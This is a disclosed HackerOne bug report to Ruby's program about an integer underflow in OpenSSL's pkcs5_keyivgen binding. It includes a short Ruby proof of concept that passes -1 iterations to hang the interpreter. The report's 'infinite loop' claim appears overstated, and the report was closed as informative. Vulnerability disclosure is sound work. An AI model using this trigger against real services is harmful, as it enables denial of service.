---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '304115'
original_report_id: '304115'
title: Integer Underflow @ ossl_cipher_pkcs5_keyivgen
weakness: Integer Underflow
team_handle: ruby
created_at: '2018-01-11T20:55:21.152Z'
disclosed_at: '2018-02-23T07:18:57.620Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 0
tags:
- hackerone
- integer-underflow
---

# Integer Underflow @ ossl_cipher_pkcs5_keyivgen

## Metadata

- HackerOne Report ID: 304115
- Weakness: Integer Underflow
- Program: ruby
- Disclosed At: 2018-02-23T07:18:57.620Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Integer Underflow @ ossl_cipher_pkcs5_keyivgen 
file : ext/openssl/ossl_cipher.c
affected parameter: iterations

INFO
Generates and sets the key/IV based on a password.
call-seq:
```
cipher.pkcs5_keyivgen(pass, salt = nil, iterations = 2048, digest = "MD5") -> nil
```


ANALYSIS
iter(int) in ossl_cipher_pkcs5_keyivgen  which holds iterations value is not validated before use.
therefore passed on to openssl library function EVP_BytesToKey which loops over
iter(iterations) using count
```
for (i = 1; i < (unsigned int)count; i++) {
  if (!EVP_DigestInit_ex(c, md, NULL))
  [code redacted]
]
```
if count aka iterations is negative this loop runs forever and therefore causing 
ruby to hang and eat up memory since allocation are performed during 
this loop and "i" can never be greater than count

POC
```
require 'digest'
require 'openssl'
require 'base64'

data = 'abc'
key = '1234567887654321'
iv = key[0..7]
cipher = OpenSSL::Cipher::Cipher.new('DES-EDE3-CBC') # or any other algorithm?

cipher.encrypt
cipher.pkcs5_keyivgen(key, iv, -1)
output = cipher.update(data)
output << cipher.final
```

CONFIGURATIONS
./ruby -v
ruby 2.6.0dev (2018-01-11 trunk 61764) [x86_64-linux]

openssl version
OpenSSL 1.0.1t  3 May 2016

## Impact

This result in a DDOS Attack

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
